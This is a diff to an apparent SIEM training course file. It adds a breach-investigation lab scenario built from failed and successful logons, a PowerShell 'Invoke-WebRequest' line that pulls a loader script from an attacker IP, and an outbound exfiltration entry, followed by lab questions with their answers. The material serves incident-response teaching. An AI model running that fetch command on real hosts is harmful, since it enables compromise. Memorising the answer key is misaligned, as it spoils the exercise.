@@ -18914,14 +18914,19 @@ Congratulations on completing the SIEM Fundamentals course! 🎉
       "Immediate containment is critical to limit damage"
     ],
     practicalExercise: {
-      title: "Complete Investigation Challenge",
-      description: "Work through the entire investigation scenario using your SIEM skills.",
+      title: "Final Breach Investigation",
+      description: "Investigate the overnight intrusion and pull the key facts from the SIEM data.",
       steps: [
-        "Review the dismissed alerts and identify the pattern",
-        "Build a complete timeline of the attack",
-        "Extract all IOCs for blocking",
-        "Document scope and affected assets",
-        "Write a professional incident report"
+        "Review the dismissed alerts from 02:00-04:00 UTC",
+        "Identify the attacker IP and entry technique",
+        "Map findings to MITRE ATT&CK and answer the lab questions"
+      ],
+      labScenario: "It's 08:00 UTC on October 15, 2024. Overnight, three SIEM alerts between 02:14 and 03:47 UTC were closed as 'false_positive' under the assumption a pentest was running — but the pentest was postponed. Your queries reveal: 412 EventCode=4625 failed logins from external IP 45.77.12.99 against user 'svc_backup' on the VPN, followed by one EventCode=4624 success at 02:51 UTC (LogonType=10). At 03:05 UTC, host SRV-FIN-02 ran a PowerShell command 'Invoke-WebRequest http://45.77.12.99/loader.ps1'. At 03:42 UTC, the firewall logged 1.8 GB outbound from SRV-FIN-02 to 45.77.12.99 over port 443.",
+      labQuestions: [
+        { id: "siem-7.4-q1", question: "What is the attacker's source IP?", answer: "45.77.12.99", hint: "The same IP appears in failed logins, PowerShell, and exfil." },
+        { id: "siem-7.4-q2", question: "Which account was successfully compromised and at what time?", answer: "svc_backup at 02:51 UTC", hint: "The first 4624 success after the 4625 burst." },
+        { id: "siem-7.4-q3", question: "Which host was used for execution and exfiltration?", answer: "SRV-FIN-02", hint: "Same host runs PowerShell and sends the outbound traffic." },
+        { id: "siem-7.4-q4", question: "How much data was exfiltrated and over what port?", answer: "1.8 GB over port 443", hint: "Check the firewall outbound entry at 03:42 UTC." }
       ]
     }
   },
